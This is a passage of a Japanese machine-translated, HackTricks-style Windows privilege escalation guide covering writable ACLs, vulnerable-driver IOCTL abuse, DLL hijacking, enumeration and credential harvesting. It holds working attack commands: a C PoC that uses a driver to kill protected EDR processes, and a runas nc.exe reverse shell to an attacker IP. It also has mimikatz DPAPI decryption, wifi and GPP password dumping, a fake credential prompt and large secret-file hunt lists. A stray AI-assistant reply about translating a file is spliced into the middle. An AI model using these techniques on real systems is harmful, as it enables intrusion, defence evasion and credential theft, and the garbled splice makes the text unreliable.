icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ はその `plugins` サブフォルダにある任意の plugin DLL を自動的にロードします。書き込み可能な portable/copy インストールが存在する場合、悪意のある plugin を配置すると、起動時に毎回 `notepad++.exe` のプロセス内で自動的にコードが実行されます（`DllMain` や plugin callbacks からも含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### スタートアップでの実行

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**読んでください** 次の **ページ** で、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

可能性のある **third party weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが任意のカーネル読み書きプリミティブを公開している場合（不適切に設計された IOCTL ハンドラで一般的）、カーネルメモリから直接 SYSTEM トークンを盗むことで権限昇格できます。手順は以下を参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが攻撃者が制御する Object Manager パスを開くような race-condition バグの場合、lookup を意図的に遅らせる（max-length components や深いディレクトリチェーンを使う）ことで、ウィンドウをマイクロ秒から数十マイクロ秒にまで拡張できます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子ノードを悪用し、メタデータ破損をカスタムドライバなしでカーネルの paged-pool オーバーフローに変換できます。完全なチェーンは以下を参照してください：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### デバイスオブジェクトで FILE_DEVICE_SECURE_OPEN が欠如していることを悪用する（LPE + EDR kill）

一部の署名済みサードパーティドライバは、IoCreateDeviceSecure を使って強力な SDDL で device object を作成しますが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがあります。このフラグがないと、余分なコンポーネントを含むパスでデバイスが開かれた場合に secure DACL が強制されず、権限のない任意のユーザが次のような namespace パスを使ってハンドルを取得できてしまいます：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例より）

ユーザがデバイスを開けるようになると、ドライバが公開する特権付き IOCTL は LPE や改ざんに悪用され得ます。実際に観測された機能の例：
- 任意プロセスへフルアクセスのハンドルを返す（トークン窃取 / SYSTEM シェル via DuplicateTokenEx/CreateProcessAsUser）。
- 制限のない生ディスクの読み書き（オフライン改ざん、ブート時永続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意プロセスの終了。これによりユーザランドからカーネル経由で AV/EDR を停止できる。

最小限の PoC パターン（user mode）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACLで制限することを意図したデバイスオブジェクトを作成する際は常に FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作に対して呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に PP/PPL チェックを追加してください。
- IOCTLs (access masks, METHOD_*, input validation) を制限し、直接 kernel 権限を与えるのではなく brokered モデルを検討してください。

防御者向け検出アイデア
- 疑わしいデバイス名への user-mode からのオープン（例: \\ .\\amsdk*）や、悪用を示す特定の IOCTL シーケンスを監視してください。
- Microsoft の vulnerable driver blocklist (HVCI/WDAC/Smart App Control) を適用し、独自の allow/deny リストを維持してください。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については次を参照してください：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**restricted services**があるか確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**このページでファイアウォール関連のコマンドを確認する**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧、ルールの作成、無効化、無効化...)**

More[ ネットワーク列挙のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります

root user を取得すれば任意のポートでリッスンできます（最初に `nc.exe` を使ってポートをリッスンすると、GUI により `nc` を firewall で許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bashをrootとして簡単に起動するには、`--default-user root` を試してください

`WSL`ファイルシステムはフォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で参照できます。

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault は、サーバー、ウェブサイト、その他のプログラム用のユーザー資格情報を保存します。これらは **Windows** が **ユーザーを自動的にログインさせる** ために使われます。最初は、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存してブラウザ経由で自動的にログインするように見えるかもしれません。しかし、そういう意味ではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせられる資格情報を保存します。つまり、リソース（サーバーやウェブサイト）にアクセスするために資格情報を必要とする任意の**Windows application that needs credentials to access a resource**が**can make use of this Credential Manager** & Windows Vault を利用し、ユーザーが毎回ユーザー名やパスワードを入力する代わりに保存された資格情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの資格情報を利用することはできないと思われます。したがって、アプリケーションが vault を利用したい場合は、デフォルトのストレージ vault からそのリソースの資格情報を取得するために、何らかの方法で**communicate with the credential manager and request the credentials for that resource**（Credential Manager と通信してそのリソースの資格情報を要求する）必要があります。

マシンに保存されている資格情報を一覧表示するには、`cmdkey` を使用します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプション付きで使用できます。次の例は SMB share 経由で remote binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意: mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) などから。

### DPAPI

**データ保護 API（DPAPI）** は、主に Windows 上で、非対称の秘密鍵を対称的に暗号化するためのデータの対称暗号化手段を提供します。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPIは、ユーザーのログインシークレットから派生した対称キーを介して鍵を暗号化することを可能にします。** システム暗号化のシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPIを使用して暗号化されたユーザーのRSA鍵は、%APPDATA%\Microsoft\Protect\{SID} ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。 **DPAPIキーは、同じファイル内でユーザーの秘密鍵を保護するマスターキーと共に格納されており、** 一般的に64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMDの `dir` コマンドでは内容を一覧表示できませんが、PowerShellでは一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` で復号できます。

**credentials files protected by the master password** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な`/masterkey`を指定して、**mimikatz module** `dpapi::cred` で復号できます。\
ルート権限がある場合、`sekurlsa::dpapi` module を使って**memory**から多くの**DPAPI** **masterkeys**を抽出できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

**PowerShell 資格情報** は、**scripting** や自動化タスクで暗号化された資格情報を便利に保存する方法としてよく使われます。これらの資格情報は **DPAPI** で保護されており、通常は作成されたのと同じユーザーかつ同じコンピュータ上でしか復号できません。

ファイルに含まれるPS 資格情報を**decrypt**するには、次のように実行します:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 無線LAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次の場所にあります: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップの資格情報マネージャ**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Mimikatz の `sekurlsa::dpapi` モジュールを使うと、メモリから多くの DPAPI マスターキーを **抽出** できます。

### Sticky Notes

Windows ワークステーションで StickyNotes アプリを使って、データベースファイルであることに気付かずに **パスワード** やその他の情報を保存していることがよくあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe からパスワードを回復するには、Administrator 権限で High Integrity レベルで実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの **credentials** が設定されており、**回復** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください .\
インストーラーは **SYSTEM privilegesで実行されます**、多くは **DLL Sideloading (情報元** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリを見つけた場合、おそらく保存された SSH key です。 それは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが実行されておらず、起動時に自動的に開始したい場合は次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。sshキーを作成し、`ssh-add`で追加してsshでマシンにログインしてみましたが、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証の間に `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使用して検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ファイル名が **SiteList.xml** のファイルを検索してください

### Cached GPP パスワード

以前、Group Policy Preferences (GPP) を使用して複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は任意のドメインユーザがアクセス可能でした。第二に、これらの GPP 内のパスワードは公開されているデフォルトキーを使って AES256 で暗号化されていましたが、認証済みの任意のユーザが復号できました。これにより、ユーザが特権昇格を行える重大なリスクが生じていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルをスキャンし、"cpassword" フィールドが空でないものを検出する関数が作成されました。そのようなファイルを見つけると、関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれ、脆弱性の特定と修復に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista より前）_ を次のファイルについて検索してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

もし彼がそれらを知っていると思うなら、常に**ユーザーに自身のcredentials、あるいは別のユーザーのcredentialsでさえ入力するよう頼む**ことができます（ただし、クライアントに直接**尋ねること**、つまり**credentials**を直接求めることは非常に**リスクが高い**ことに注意してください）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前**passwords**が**clear-text**または**Base64**で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your filesystem or repository. Do you want me to translate the file src/windows-hardening/windows-local-privilege-escalation/README.md into Japanese? If yes, paste the file content here (or provide the list of "proposed files" you want searched/transformed).
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内のCredentials

Binも確認して、そこにcredentialsがないか探してください。

複数のプログラムに保存された **recover passwords** を行うには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**credentials を含むその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザ履歴

Chrome or Firefox のパスワードが保存されている DB を確認するべきです。\
ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこで **パスワード** が保存されている場合があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは **identified via a class ID (CLSID)** によって識別され、各コンポーネントは 1 つ以上のインターフェース（identified via interface IDs (IIDs)）を通じて機能を公開します。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果が **HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される **DLL のいずれかを上書き**できれば、その DLL が別のユーザーによって実行される場合に **escalate privileges** できます。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよびレジストリ内の一般的なパスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリをキー名やパスワードで検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインで、私はこのプラグインを被害者のシステム内で **automatically execute every metasploit POST module that searches for credentials** を実行するために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
